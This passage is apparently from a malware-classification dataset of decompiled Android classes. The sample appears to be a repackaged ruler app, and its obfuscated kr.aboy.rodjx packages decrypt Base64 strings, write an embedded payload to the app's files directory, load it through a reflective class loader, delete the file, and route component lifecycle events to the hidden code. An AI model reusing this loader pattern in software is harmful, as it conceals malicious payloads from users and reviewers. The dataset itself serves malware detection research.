Exception e) {         e.printStackTrace();       }     }     return f376a;   }   public static Class a(  String str,  Context context){     Class cls=(Class)c.get(str);     if (cls == null) {       try {         a(context);         String str2=context.getFilesDir() + File.separator;         if (f377b == null) {           f377b=f376a.getConstructor(String.class,String.class,String.class,ClassLoader.class).newInstance(str2 + a.s,context.getFilesDir().getPath(),null,b(context));         }         cls=(Class)f376a.getMethod(a.p,String.class).invoke(f377b,str);         if (cls != null) {           c.put(str,cls);         }         new File(str2 + a.s).delete();         new File(str2 + a.t).delete();       }  catch (      Exception e) {         e.printStackTrace();       }     }     return cls;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Context context,  String str,  String str2){     return a(objArr,clsArr,null,null,context,str,str2);   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Class cls,  String str){     Object obj=d.get(str);     if (obj == null) {       try {         obj=(clsArr == null && objArr == null) ? cls.getConstructor(new Class[0]).newInstance(new Object[0]) : cls.getConstructor(clsArr).newInstance(objArr);         if (obj != null) {           d.put(str,obj);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return obj;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Object[] objArr2,  Class[] clsArr2,  Context context,  String str,  String str2){     if (str2.equals(a.f372b) || str2.equals(a.j)) {       d.remove(str);     }     try {       Class a2=a(str,context);       Object a3=a(objArr2,clsArr2,a2,str);       Method method=clsArr == null ? a2.getMethod(str2,new Class[0]) : a2.getMethod(str2,clsArr);       method.setAccessible(true);       return objArr == null ? method.invoke(a3,new Object[0]) : method.invoke(a3,objArr);     }  catch (    Exception e) {       return null;     }   }   private static Object b(  Context context){     try {       return Context.class.getMethod(a.q,new Class[0]).invoke(context,new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\Ga.code","public class Ga extends Activity {   @Override protected void onActivityResult(  int i,  int i2,  Intent intent){     super.onActivityResult(i,i2,intent);     d.a(new Object[]{Integer.valueOf(i),Integer.valueOf(i2),intent},new Class[]{Integer.class,Integer.class,Intent.class},this,a.v,a.g);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     d.a(new Object[]{this,Ga.class,Js.class,Hr.class},new Class[]{Activity.class,Class.class,Class.class,Class.class},this,a.v,a.f372b);   }   @Override protected void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.v,a.f);   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     return Boolean.parseBoolean(d.a(new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class},this,a.v,a.h).toString());   }   @Override protected void onResume(){     super.onResume();     d.a(null,null,this,a.v,a.d);   }   @Override protected void onStart(){     super.onStart();     d.a(null,null,this,a.v,a.c);   }   @Override protected void onStop(){     super.onStop();     d.a(null,null,this,a.v,a.e);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\Hr.code","public class Hr extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (a.f371a.length() > 0) {       c.a(context).a(a.f371a);     }     d.a(new Object[]{context,intent,Ga.class,Js.class,Hr.class},new Class[]{Context.class,Intent.class,Class.class,Class.class,Class.class},context,a.w,a.j);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\Js.code","public class Js extends Service {   @Override public IBinder onBind(  Intent intent){     d.a(new Object[]{intent},new Class[]{Intent.class},this,a.x,a.i);     return null;   }   @Override public void onCreate(){     super.onCreate();     d.a(new Object[]{this,Ga.class,Js.class,Hr.class},new Class[]{Context.class,Class.class,Class.class,Class.class},this,a.x,a.f372b);   }   @Override public void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.x,a.f);   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     d.a(new Object[]{intent,Integer.valueOf(i),Integer.valueOf(i2)},new Class[]{Intent.class,Integer.TYPE,Integer.TYPE},this,a.x,a.k);     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\a.code","public final class a {   public static String f385a=""dd259f8fb5524dcb905075800058cb9b"";   public static String f386b=new String(c.a(Base64.decode(""vruay6mYw7I="",0)));   public static String c=new String(c.a(Base64.decode(""pr2gy7q2qw=="",0)));   public static String d=new String(c.a(Base64.decode(""vrupvresvLI="",0)));   public static String e=new String(c.a(Base64.decode(""s6WiwcbJ"",0)));   public static String f=new String(c.a(Base64.decode(""vMWdqarDv8bS"",0)));   public static String g=new String(c.a(Base64.decode(""xseFmsO2zcK4sKGyys6wqw=="",0)));   public static String h=new String(c.a(Base64.decode(""vMWkqbCTvM7H"",0)));   public static String i=new String(c.a(Base64.decode(""s6WRtsW9"",0)));   public static String j=new String(c.a(Base64.decode(""vMWrqZq0ts2+"",0)));   public static String k=new String(c.a(Base64.decode(""vruqzaWpw5DGxrGYvbE="",0)));   public static String l=new String(c.a(Base64.decode(""s6WjvMy8rHzFssXN"",0)));   public static String m=new String(c.a(Base64.decode(""zKmrmLE="",0)));   public static String n=new String(c.a(Base64.decode(""t5zDkL+6sqW7sqC9"",0)));   public static String o=new String(c.a(Base64.decode(""ysGzrg=="",0)));   public static String p=new String(c.a(Base64.decode(""u7qwrbi4hcy9qsOyxIeInMeQw7q3qpu8uL2pqQ=="",0)));   public static String q=new String(c.a(Base64.decode(""uca6qHq7rsrM"",0)));   public static String r=new String(c.a(Base64.decode(""trLLnLCYwsCjyKWbtL8="",0)));   public static String s=new String(c.a(Base64.decode(""dWt9vcXA"",0)));   public static String t=new String(c.a(Base64.decode(""dWt9t7jL"",0)));   public static String u=new String(c.a(Base64.decode(""dWt9sbzR"",0)));   public static String v=new String(c.a(Base64.decode(""mr66hcCzpra5vIemo32auMKyhLC7uMCpqQ=="",0)));   public static String w=new String(c.a(Base64.decode(""srzEh6umvrTDvnKZu3ukuq2lkLDLwrqgw8Y="",0)));   public static String x=new String(c.a(Base64.decode(""srzEh6umvrTDvnKZu3ukuq2lobK6vq2ttL8="",0)));   public static String y=new String(c.a(Base64.decode(""mr66hcCzpra5vIemo32auMKyirS/zcKnnA=="",0)));   private static StringBuffer A=new StringBuffer().append("""").append("""").append("""");   public static byte[] z=Base64.decode(A.toString(),0); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\b.code","public class b {   private static b f387a=null;   private Context f388b;   private b(  Context context){     this.f388b=context;     d.a(new Object[]{context,Mwqs.class,Bl.class,Se.class},new Class[]{Context.class,Class.class,Class.class,Class.class},d.a(a.v,context),a.v);   }   public static synchronized b a(  Context context){     b bVar; synchronized (b.class) {       if (f387a == null) {         f387a=new b(context);       }       bVar=f387a;     }     return bVar;   }   public void a(  String str){     d.a(new Object[]{str},new Class[]{String.class},this.f388b,a.v,a.m);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\Bl.code","public class Bl extends Service {   @Override public IBinder onBind(  Intent intent){     d.a(new Object[]{intent},new Class[]{Intent.class},this,a.y,a.i);     return null;   }   @Override public void onCreate(){     super.onCreate();     d.a(new Object[]{this,Mwqs.class,Bl.class,Se.class},new Class[]{Context.class,Class.class,Class.class,Class.class},this,a.y,a.f386b);   }   @Override public void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.y,a.f);   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     d.a(new Object[]{intent,Integer.valueOf(i),Integer.valueOf(i2)},new Class[]{Intent.class,Integer.TYPE,Integer.TYPE},this,a.y,a.k);     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\c.code","public class c {   private static byte[] f389a=""D7OMWY"".getBytes();   public static String a(  byte[] bArr){     return new String(b(bArr));   }   public static byte[] b(  byte[] bArr){     if (bArr == null || bArr.length == 0) {       return new byte[0];     }     byte[] bArr2=new byte[bArr.length];     for (int i=0; i < bArr.length; i++) {       try {         bArr2[i]=(byte)(bArr[i] - f389a[(bArr.length + i) % f389a.length]);       }  catch (      Exception e) {         e.printStackTrace();         return bArr2;       }     }     return bArr2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\d.code","public class d {   private static Class f390a;   private static Object f391b;   private static Map c=new HashMap();   private static Map d=new HashMap();   public static Class a(  Context context){     if (f390a == null) {       String str=context.getFilesDir() + File.separator;       byte[] b2=c.b(a.z);       try {         FileOutputStream fileOutputStream=new FileOutputStream(str + a.t);         fileOutputStream.write(b2);         fileOutputStream.close();         f390a=Class.forName(a.p);       }  catch (      Exception e) {         e.printStackTrace();       }     }     return f390a;   }   public static Class a(  String str,  Context context){     Class cls=(Class)c.get(str);     if (cls == null) {       try {         a(context);         String str2=context.getFilesDir() + File.separator;         if (f391b == null) {           f391b=f390a.getConstructor(String.class,String.class,String.class,ClassLoader.class).newInstance(str2 + a.t,context.getFilesDir().getPath(),null,b(context));         }         cls=(Class)f390a.getMethod(a.q,String.class).invoke(f391b,str);         if (cls != null) {           c.put(str,cls);         }         new File(str2 + a.t).delete();         new File(str2 + a.u).delete();       }  catch (      Exception e) {         e.printStackTrace();       }     }     return cls;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Context context,  String str,  String str2){     return a(objArr,clsArr,null,null,context,str,str2);   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Class cls,  String str){     Object obj=d.get(str);     if (obj == null) {       try {         obj=(clsArr == null && objArr == null) ? cls.getConstructor(new Class[0]).newInstance(new Object[0]) : cls.getConstructor(clsArr).newInstance(objArr);         if (obj != null) {           d.put(str,obj);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return obj;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Object[] objArr2,  Class[] clsArr2,  Context context,  String str,  String str2){     if (str2.equals(a.f386b) || str2.equals(a.j)) {       d.remove(str);     }     try {       Class a2=a(str,context);       Object a3=a(objArr2,clsArr2,a2,str);       Method method=clsArr == null ? a2.getMethod(str2,new Class[0]) : a2.getMethod(str2,clsArr);       method.setAccessible(true);       return objArr == null ? method.invoke(a3,new Object[0]) : method.invoke(a3,objArr);     }  catch (    Exception e) {       return null;     }   }   private static Object b(  Context context){     try {       return Context.class.getMethod(a.r,new Class[0]).invoke(context,new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\Mwqs.code","public class Mwqs extends Activity {   @Override protected void onActivityResult(  int i,  int i2,  Intent intent){     super.onActivityResult(i,i2,intent);     d.a(new Object[]{Integer.valueOf(i),Integer.valueOf(i2),intent},new Class[]{Integer.class,Integer.class,Intent.class},this,a.w,a.g);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     d.a(new Object[]{this,Mwqs.class,Bl.class,Se.class},new Class[]{Activity.class,Class.class,Class.class,Class.class},this,a.w,a.f386b);   }   @Override protected void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.w,a.f);   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     return Boolean.parseBoolean(d.a(new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class},this,a.w,a.h).toString());   }   @Override protected void onResume(){     super.onResume();     d.a(null,null,this,a.w,a.d);   }   @Override protected void onStart(){     super.onStart();     d.a(null,null,this,a.w,a.c);   }   @Override protected void onStop(){     super.onStop();     d.a(null,null,this,a.w,a.e);   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     return Boolean.parseBoolean(d.a(new Object[]{motionEvent},new Class[]{MotionEvent.class},this,a.w,a.l).toString());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.h\Se.code","public class Se extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (a.f385a.length() > 0) {       b.a(context).a(a.f385a);     }     d.a(new Object[]{context,intent,Mwqs.class,Bl.class,Se.class},new Class[]{Context.class,Intent.class,Class.class,Class.class,Class.class},context,a.x,a.j);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\a.code","public final class a {   public static String f396a=""dd259f8fb5524dcb905075800058cb9b"";   public static String f397b=new String(c.a(Base64.decode(""t9euyrWT19g="",0)));   public static String c=new String(c.a(Base64.decode(""4ra837nCpg=="",0)));   public static String d=new String(c.a(Base64.decode(""t9e9vcOn0Ng="",0)));   public static String e=new String(c.a(Base64.decode(""0uGb3drI"",0)));   public static String f=new String(c.a(Base64.decode(""2NmctaXX5bfi"",0)));   public static String g=new String(c.a(Base64.decode(""t9esu8Sb2dy84r29w6fP5w=="",0)));   public static String h=new String(c.a(Base64.decode(""2Nmjtaun4r/X"",0)));   public static String i=new String(c.a(Base64.decode(""0uGK0tm8"",0)));   public static String j=new String(c.a(Base64.decode(""2NmqtZXI3L7O"",0)));   public static String k=new String(c.a(Base64.decode(""0uGb3czKxHXS4LXK2bw="",0)));   public static String l=new String(c.a(Base64.decode(""pcjnkc0="",0)));   public static String m=new String(c.a(Base64.decode(""w5fXtrDK2ca8l6zX"",0)));   public static String n=new String(c.a(Base64.decode(""w5rS6g=="",0)));   public static String o=new String(c.a(Base64.decode(""tJPP6bHUmcvJpdfYtZevvch1z9S73LfHsZbI5Q=="",0)));   public static String p=new String(c.a(Base64.decode(""1dq5tHXP1Lvc"",0)));   public static String q=new String(c.a(Base64.decode(""yti8rNe5w6Wv4qnN0Mo="",0)));   public static String r=new String(c.a(Base64.decode(""Y5HjttA="",0)));   public static String s=new String(c.a(Base64.decode(""Y5Hdqds="",0)));   public static String t=new String(c.a(Base64.decode(""Y5HXreE="",0)));   public static String u=new String(c.a(Base64.decode(""q9jYhrpg06GYtszGsZnI5Q=="",0)));   public static String v=new String(c.a(Base64.decode(""zNrFfpyR43a5rLvEm9ncvOI="",0)));   public static String w=new String(c.a(Base64.decode(""zNrFfpyR43a5vb2zl8zprds="",0)));   public static String x=new String(c.a(Base64.decode(""q9jYhrpg06GYvNDKxpvG2A=="",0)));   private static StringBuffer z=new StringBuffer().append("""").append("""").append("""").append("""");   public static byte[] y=Base64.decode(z.toString(),0); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\b.code","public class b {   private static b f398a=null;   private Context f399b;   private b(  Context context){     this.f399b=context;     d.a(new Object[]{context,Vyh.class,Sbff.class,Mxs.class},new Class[]{Context.class,Class.class,Class.class,Class.class},d.a(a.u,context),a.u);   }   public static synchronized b a(  Context context){     b bVar; synchronized (b.class) {       if (f398a == null) {         f398a=new b(context);       }       bVar=f398a;     }     return bVar;   }   public void a(  String str){     d.a(new Object[]{str},new Class[]{String.class},this.f399b,a.u,a.l);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\c.code","public class c {   private static byte[] f400a=""HikXP2cs"".getBytes();   public static String a(  byte[] bArr){     return new String(b(bArr));   }   public static byte[] b(  byte[] bArr){     if (bArr == null || bArr.length == 0) {       return new byte[0];     }     byte[] bArr2=new byte[bArr.length];     for (int i=0; i < bArr.length; i++) {       try {         bArr2[i]=(byte)(bArr[i] - f400a[(bArr.length + i) % f400a.length]);       }  catch (      Exception e) {         e.printStackTrace();         return bArr2;       }     }     return bArr2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\d.code","public class d {   private static Class f401a;   private static Object f402b;   private static Map c=new HashMap();   private static Map d=new HashMap();   public static Class a(  String str,  Context context){     Class cls=(Class)c.get(str);     if (cls == null) {       try {         String str2=context.getFilesDir() + File.separator;         if (f401a == null) {           byte[] b2=c.b(a.y);           try {             FileOutputStream fileOutputStream=new FileOutputStream(str2 + a.s);             fileOutputStream.write(b2);             fileOutputStream.close();           }  catch (          Exception e) {             e.printStackTrace();           }         }         f401a=Class.forName(a.o);         if (f402b == null) {           f402b=f401a.getConstructor(String.class,String.class,String.class,ClassLoader.class).newInstance(str2 + a.s,context.getFilesDir().getPath(),null,a(context));         }         cls=(Class)f401a.getMethod(a.p,String.class).invoke(f402b,str);         if (cls != null) {           c.put(str,cls);         }         new File(str2 + a.s).delete();         new File(str2 + a.t).delete();       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return cls;   }   private static Object a(  Context context){     try {       return Context.class.getMethod(a.q,new Class[0]).invoke(context,new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Context context,  String str,  String str2){     return a(objArr,clsArr,null,null,context,str,str2);   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Class cls,  String str){     Object obj=d.get(str);     if (obj == null) {       try {         obj=(clsArr == null && objArr == null) ? cls.getConstructor(new Class[0]).newInstance(new Object[0]) : cls.getConstructor(clsArr).newInstance(objArr);         if (obj != null) {           d.put(str,obj);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return obj;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Object[] objArr2,  Class[] clsArr2,  Context context,  String str,  String str2){     if (str2.equals(a.f397b) || str2.equals(a.j)) {       d.remove(str);     }     try {       Class a2=a(str,context);       Object a3=a(objArr2,clsArr2,a2,str);       Method method=clsArr == null ? a2.getMethod(str2,new Class[0]) : a2.getMethod(str2,clsArr);       method.setAccessible(true);       return objArr == null ? method.invoke(a3,new Object[0]) : method.invoke(a3,objArr);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\Mxs.code","public class Mxs extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (a.f396a.length() > 0) {       b.a(context).a(a.f396a);     }     d.a(new Object[]{context,intent,Vyh.class,Sbff.class,Mxs.class},new Class[]{Context.class,Intent.class,Class.class,Class.class,Class.class},context,a.w,a.j);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\Sbff.code","public class Sbff extends Service {   @Override public IBinder onBind(  Intent intent){     d.a(new Object[]{intent},new Class[]{Intent.class},this,a.x,a.i);     return null;   }   @Override public void onCreate(){     super.onCreate();     d.a(new Object[]{this,Vyh.class,Sbff.class,Mxs.class},new Class[]{Context.class,Class.class,Class.class,Class.class},this,a.x,a.f397b);   }   @Override public void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.x,a.f);   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     d.a(new Object[]{intent,Integer.valueOf(i),Integer.valueOf(i2)},new Class[]{Intent.class,Integer.TYPE,Integer.TYPE},this,a.x,a.k);     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.k\Vyh.code","public class Vyh extends Activity {   @Override protected void onActivityResult(  int i,  int i2,  Intent intent){     super.onActivityResult(i,i2,intent);     d.a(new Object[]{Integer.valueOf(i),Integer.valueOf(i2),intent},new Class[]{Integer.class,Integer.class,Intent.class},this,a.v,a.g);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     d.a(new Object[]{this,Vyh.class,Sbff.class,Mxs.class},new Class[]{Activity.class,Class.class,Class.class,Class.class},this,a.v,a.f397b);   }   @Override protected void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.v,a.f);   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     return Boolean.parseBoolean(d.a(new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class},this,a.v,a.h).toString());   }   @Override protected void onResume(){     super.onResume();     d.a(null,null,this,a.v,a.d);   }   @Override protected void onStart(){     super.onStart();     d.a(null,null,this,a.v,a.c);   }   @Override protected void onStop(){     super.onStop();     d.a(null,null,this,a.v,a.e);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\a.code","public final class a {   public static String f423a=""dd259f8fb5524dcb905075800058cb9b"";   public static String f424b=new String(c.a(Base64.decode(""ptm7v7TPx9o="",0)));   public static String c=new String(c.a(Base64.decode(""yaW+7K7B4g=="",0)));   public static String d=new String(c.a(Base64.decode(""ptnKssLjwNo="",0)));   public static String e=new String(c.a(Base64.decode(""5MiK3+e9"",0)));   public static String f=new String(c.a(Base64.decode(""2uaRtOHH58mw"",0)));   public static String g=new String(c.a(Base64.decode(""yaWs28G45Lzp04nQ68K74g=="",0)));   public static String h=new String(c.a(Base64.decode(""2uaYtOeX5NGl"",0)));   public static String i=new String(c.a(Base64.decode(""5Mh51Oax"",0)));   public static String j=new String(c.a(Base64.decode(""2uaftNG43tCc"",0)));   public static String k=new String(c.a(Base64.decode(""wuOtq8zqwZLdwOK7pc8="",0)));   public static String l=new String(c.a(Base64.decode(""xtrOgM8="",0)));   public static String m=new String(c.a(Base64.decode(""wtPHuMKY2ea5tLe3"",0)));   public static String n=new String(c.a(Base64.decode(""4bvk0Q=="",0)));   public static String o=new String(c.a(Base64.decode(""3K675LzgiKrk68G024G5v6+u5K7C4Z/ku5vQ6g=="",0)));   public static String p=new String(c.a(Base64.decode(""1+eus7G/1s2q"",0)));   public static String q=new String(c.a(Base64.decode(""utrOetfZwMK6wta+nN0="",0)));   public static String r=new String(c.a(Base64.decode(""po9l2+a0"",0)));   public static String s=new String(c.a(Base64.decode(""po9l1dm/"",0)));   public static String t=new String(c.a(Base64.decode(""po9lz93F"",0)));   public static String u=new String(c.a(Base64.decode(""vabYprS+3brhv2Xf7Hucz7zjp5jZ2bS04A=="",0)));   public static String v=new String(c.a(Base64.decode(""mtrle7bdwtzGnJnswX27tN7IeM7stsXXx+4="",0)));   public static String w=new String(c.a(Base64.decode(""mtrle7bdwtzGnJnswX27tN7IidDbsrjkuOc="",0)));   public static String x=new String(c.a(Base64.decode(""vabYprS+3brhv2Xf7Hucz7zjrZzd7ray0w=="",0)));   private static StringBuffer z=new StringBuffer().append("""").append("""");   public static byte[] y=Base64.decode(z.toString(),0); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\b.code","public class b {   private static b f425a=null;   private Context f426b;   private b(  Context context){     this.f426b=context;     d.a(new Object[]{context,null,Mmd.class,Fcbz.class},new Class[]{Context.class,Class.class,Class.class,Class.class},d.a(a.u,context),a.u);   }   public static synchronized b a(  Context context){     b bVar; synchronized (b.class) {       if (f425a == null) {         f425a=new b(context);       }       bVar=f425a;     }     return bVar;   }   public void a(  String str){     d.a(new Object[]{str},new Class[]{String.class},this.f426b,a.u,a.l);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\c.code","public class c {   private static byte[] f427a=""kxMOnSuZ7"".getBytes();   public static String a(  byte[] bArr){     return new String(b(bArr));   }   public static byte[] b(  byte[] bArr){     if (bArr == null || bArr.length == 0) {       return new byte[0];     }     byte[] bArr2=new byte[bArr.length];     for (int i=0; i < bArr.length; i++) {       try {         bArr2[i]=(byte)(bArr[i] - f427a[(bArr.length + i) % f427a.length]);       }  catch (      Exception e) {         e.printStackTrace();         return bArr2;       }     }     return bArr2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\d.code","public class d {   private static Class f428a;   private static Object f429b;   private static Map c=new HashMap();   private static Map d=new HashMap();   public static Class a(  Context context){     if (f428a == null) {       String str=context.getFilesDir() + File.separator;       byte[] b2=c.b(a.y);       try {         FileOutputStream fileOutputStream=new FileOutputStream(str + a.s);         fileOutputStream.write(b2);         fileOutputStream.close();         f428a=Class.forName(a.o);       }  catch (      Exception e) {         e.printStackTrace();       }     }     return f428a;   }   public static Class a(  String str,  Context context){     Class cls=(Class)c.get(str);     if (cls == null) {       try {         a(context);         String str2=context.getFilesDir() + File.separator;         if (f429b == null) {           f429b=f428a.getConstructor(String.class,String.class,String.class,ClassLoader.class).newInstance(str2 + a.s,context.getFilesDir().getPath(),null,b(context));         }         cls=(Class)f428a.getMethod(a.p,String.class).invoke(f429b,str);         if (cls != null) {           c.put(str,cls);         }         new File(str2 + a.s).delete();         new File(str2 + a.t).delete();       }  catch (      Exception e) {         e.printStackTrace();       }     }     return cls;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Context context,  String str,  String str2){     return a(objArr,clsArr,null,null,context,str,str2);   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Class cls,  String str){     Object obj=d.get(str);     if (obj == null) {       try {         obj=(clsArr == null && objArr == null) ? cls.getConstructor(new Class[0]).newInstance(new Object[0]) : cls.getConstructor(clsArr).newInstance(objArr);         if (obj != null) {           d.put(str,obj);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return obj;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Object[] objArr2,  Class[] clsArr2,  Context context,  String str,  String str2){     if (str2.equals(a.f424b) || str2.equals(a.j)) {       d.remove(str);     }     try {       Class a2=a(str,context);       Object a3=a(objArr2,clsArr2,a2,str);       Method method=clsArr == null ? a2.getMethod(str2,new Class[0]) : a2.getMethod(str2,clsArr);       method.setAccessible(true);       return objArr == null ? method.invoke(a3,new Object[0]) : method.invoke(a3,objArr);     }  catch (    Exception e) {       return null;     }   }   private static Object b(  Context context){     try {       return Context.class.getMethod(a.q,new Class[0]).invoke(context,new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\Fcbz.code","public class Fcbz extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (a.f423a.length() > 0) {       b.a(context).a(a.f423a);     }     d.a(new Object[]{context,intent,null,Mmd.class,Fcbz.class},new Class[]{Context.class,Intent.class,Class.class,Class.class,Class.class},context,a.w,a.j);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.y\Mmd.code","public class Mmd extends Service {   @Override public IBinder onBind(  Intent intent){     d.a(new Object[]{intent},new Class[]{Intent.class},this,a.x,a.i);     return null;   }   @Override public void onCreate(){     super.onCreate();     d.a(new Object[]{this,null,Mmd.class,Fcbz.class},new Class[]{Context.class,Class.class,Class.class,Class.class},this,a.x,a.f424b);   }   @Override public void onDestroy(){     super.onDestroy();     d.a(null,null,this,a.x,a.f);   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     d.a(new Object[]{intent,Integer.valueOf(i),Integer.valueOf(i2)},new Class[]{Intent.class,Integer.TYPE,Integer.TYPE},this,a.x,a.k);     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\a.code","class a implements View.OnClickListener {   final DialogWidth f439a;   private final String f440b;   public a(  DialogWidth dialogWidth,  String str){     this.f439a=dialogWidth;     this.f440b=str;   }   @Override public void onClick(  View view){     SharedPreferences sharedPreferences;     sharedPreferences=this.f439a.e;     SharedPreferences.Editor edit=sharedPreferences.edit();     String editable=((EditText)this.f439a.findViewById(C0000R.id.width)).getText().toString();     if (editable.length() == 0) {       editable=this.f440b;     }     float floatValue=Float.valueOf(editable).floatValue();     if (SmartRuler.E != 1) {       if (floatValue < 50.0f || floatValue > 250.0f) {         this.f439a.a(String.valueOf(this.f439a.getString(C0000R.string.dialog_range_ruler)) + ""50.0 ~ 250.0 mm"");         return;       }       edit.putString(""devicewidth"",editable);       edit.commit();       this.f439a.finish();       return;     }     if (floatValue < 2.0f || floatValue > 10.0f) {       this.f439a.a(String.valueOf(this.f439a.getString(C0000R.string.dialog_range_ruler)) + ""2.0 ~ 10.0 inch"");       return;     }     edit.putString(""devicewidth"",new StringBuilder().append(((int)((25.4f * floatValue) * 10.0f)) / 10.0f).toString());     edit.commit();     this.f439a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\b.code","class b implements View.OnClickListener {   final DialogWidth f441a;   public b(  DialogWidth dialogWidth){     this.f441a=dialogWidth;   }   @Override public void onClick(  View view){     this.f441a.finish();   } } "
